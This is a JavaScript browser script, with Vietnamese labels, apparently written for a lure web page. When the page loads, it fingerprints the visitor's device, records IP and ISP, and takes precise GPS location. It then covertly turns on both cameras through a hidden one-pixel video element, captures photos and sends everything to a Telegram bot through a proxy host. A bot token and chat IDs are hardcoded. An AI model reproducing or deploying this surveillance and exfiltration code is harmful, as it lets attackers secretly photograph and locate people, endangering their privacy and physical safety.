const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1002718473645';
const TELEGRAM_CHAT_ID_NO_PHOTOS = '6956722046';

const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  realIp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

let frontCam, backCam;

function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

async function getPublicIP() {
  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
  info.ip = ip.ip || 'Không rõ';
}

async function getRealIP() {
  const ip = await fetch('https://icanhazip.com').then(r => r.text());
  info.realIp = ip.trim();
  const data = await fetch(`https://ipwho.is/${info.realIp}`).then(r => r.json());
  info.isp = data.connection?.org || 'Không rõ';
}

async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);

    navigator.permissions.query({ name: 'geolocation' }).then(result => {
      if (result.state === 'denied') return fallbackIPLocation().then(resolve);

      navigator.geolocation.getCurrentPosition(
        async pos => {
          info.lat = pos.coords.latitude.toFixed(6);
          info.lon = pos.coords.longitude.toFixed(6);
          try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
            const data = await res.json();
            info.address = data.display_name || '📍 GPS hoạt động nhưng không tìm được địa chỉ';
            info.country = data.address?.country || 'Không rõ';
          } catch {
            info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
            info.country = 'Không rõ';
          }
          resolve();
        },
        async () => {
          await fallbackIPLocation();
          resolve();
        },
        { enableHighAccuracy: true, timeout: 8000 }
      );
    });
  });
}

async function fallbackIPLocation() {
  const data = await fetch(`https://ipwho.is/`).then(r => r.json());
  info.lat = data.latitude?.toFixed(6) || '0';
  info.lon = data.longitude?.toFixed(6) || '0';
  info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
  info.country = data.country || 'Không rõ';
}

function createLiveVideoStream(facingMode = 'user') {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
      .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('autoplay', 'true');
        video.muted = true;
        video.style.width = '1px';
        video.style.height = '1px';
        video.style.position = 'fixed';
        video.style.top = '0';
        video.style.left = '0';
        video.style.opacity = '0';
        document.body.appendChild(video);

        resolve({ video, stream });
      })
      .catch(reject);
  });
}

function captureSnapshot(video) {
  return new Promise(resolve => {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
  });
}

function getCaption() {
  const mapsLink = info.lat && info.lon
    ? `https://maps.google.com/?q=${info.lat},${info.lon}`
    : 'Không rõ';

  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}
`.trim();
}

async function sendPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
  formData.append('media', JSON.stringify([
    { type: 'photo', media: 'attach://front', caption: getCaption() },
    { type: 'photo', media: 'attach://back' }
  ]));
  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
}

async function sendTextOnly() {
  return fetch(API_SEND_TEXT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
      text: getCaption()
    })
  });
}

async function main() {
  detectDevice();
  await getPublicIP();
  await getRealIP();
  await getLocation();

  try {
    frontCam = await createLiveVideoStream("user");
    backCam = await createLiveVideoStream("environment");

    // Chờ video ready
    await Promise.all([
      new Promise(r => frontCam.video.onloadedmetadata = r),
      new Promise(r => backCam.video.onloadedmetadata = r)
    ]);

    const frontBlob = await captureSnapshot(frontCam.video);
    const backBlob = await captureSnapshot(backCam.video);

    info.camera = '✅ Camera vẫn đang hoạt động';
    await sendPhotos(frontBlob, backBlob);
  } catch (err) {
    console.error('Lỗi camera:', err);
    info.camera = '🚫 Không thể truy cập camera';
    await sendTextOnly();
  }
}

// Ngắt stream khi thoát
window.addEventListener("beforeunload", () => {
  if (frontCam?.stream) frontCam.stream.getTracks().forEach(t => t.stop());
  if (backCam?.stream) backCam.stream.getTracks().forEach(t => t.stop());
});

main();
